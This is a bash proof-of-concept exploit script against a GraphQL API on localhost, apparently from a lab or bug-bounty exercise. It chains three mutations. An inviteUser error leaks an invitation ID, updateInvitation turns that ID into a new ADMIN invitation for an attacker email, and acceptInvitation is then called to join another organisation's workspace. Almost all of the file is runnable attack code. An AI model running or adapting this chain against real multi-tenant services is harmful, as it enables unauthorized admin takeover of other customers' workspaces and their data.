#!/usr/bin/env bash
set -euo pipefail

# Required environment variables
: "${TOKEN:?Need to set TOKEN}"
: "${MEGACORP_WORKSPACE_ID:?Need to set MEGACORP_WORKSPACE_ID}"
: "${ATTACKER_EMAIL:?Need to set ATTACKER_EMAIL}"

GRAPHQL_ENDPOINT="http://localhost/graphql"

echo "Part A: Run the failing mutation and try to extract the ID..."

LEAK_RESPONSE=$(curl -sS -H 'Content-Type: application/json' -H "Authorization: JWT ${TOKEN}" \
  --data @- "${GRAPHQL_ENDPOINT}" <<JSON
{
  "query": "mutation InviteUser(\$wsId: UUID!, \$email: String!, \$role: String!) { inviteUser(workspaceId: \$wsId, email: \$email, role: \$role) { invitation { id } } }",
  "variables": {
    "wsId": "${MEGACORP_WORKSPACE_ID}",
    "email": "cookie@synchgrid.com",
    "role": "VIEWER"
  }
}
JSON
)

echo "Server response:"
printf '%s\n' "$LEAK_RESPONSE"

LEAKED_INVITE_ID=$(printf '%s' "$LEAK_RESPONSE" | jq -r '.errors[]?.message // empty' \
  | sed -n 's/.*Original invitation ID: \([a-f0-9-]*\).*/\1/p' | head -n1 || true)

if [ -z "${LEAKED_INVITE_ID}" ]; then
  echo "Error: Failed to leak invitation ID."
  exit 1
fi

echo "SUCCESS: Leaked Invitation ID: ${LEAKED_INVITE_ID}"
echo ""

# Part B: Use the leaked ID to hijack and CREATE A NEW invitation
echo "Part B: Attempting to hijack invitation with leaked ID..."

HIJACK_RESPONSE=$(curl -sS -H 'Content-Type: application/json' -H "Authorization: JWT ${TOKEN}" \
  --data @- "${GRAPHQL_ENDPOINT}" <<JSON
{
  "query": "mutation UpdateInvitation(\$invId: UUID!, \$newRole: String!, \$newEmail: String!) { updateInvitation(invitationId: \$invId, newRole: \$newRole, newEmail: \$newEmail) { newInvitation { id } } }",
  "variables": {
    "invId": "${LEAKED_INVITE_ID}",
    "newRole": "ADMIN",
    "newEmail": "${ATTACKER_EMAIL}"
  }
}
JSON
)

echo "Hijack response:"
printf '%s\n' "$HIJACK_RESPONSE"

# ** THE FIX IS HERE **
# Extract the ID of the NEW invitation from the hijack response
NEW_INVITE_ID=$(printf '%s' "$HIJACK_RESPONSE" | jq -r '.data.updateInvitation.newInvitation.id // empty')

if [ -z "${NEW_INVITE_ID}" ]; then
    echo "Error: Failed to get new invitation ID from hijack."
    exit 1
fi

echo "SUCCESS: Hijacked and created new invitation with ID: ${NEW_INVITE_ID}"
echo ""

# Part C: Accept the NEW invitation
echo "Part C: Accepting the newly created invitation..."
ACCEPT_RESPONSE=$(curl -sS -H 'Content-Type: application/json' -H "Authorization: JWT ${TOKEN}" \
    --data @- "${GRAPHQL_ENDPOINT}" <<JSON
{
    "query": "mutation Accept(\$invId: UUID!) { acceptInvitation(invitationId: \$invId) { workspaceMembership { workspace { name } } } }",
    "variables": { "invId": "${NEW_INVITE_ID}" }
}
JSON
)

echo "Accept response:"
printf '%s\n' "$ACCEPT_RESPONSE"
echo "---"
echo "Exploit complete! You should now have access to the 'synchgrid' workspace on your dashboard."

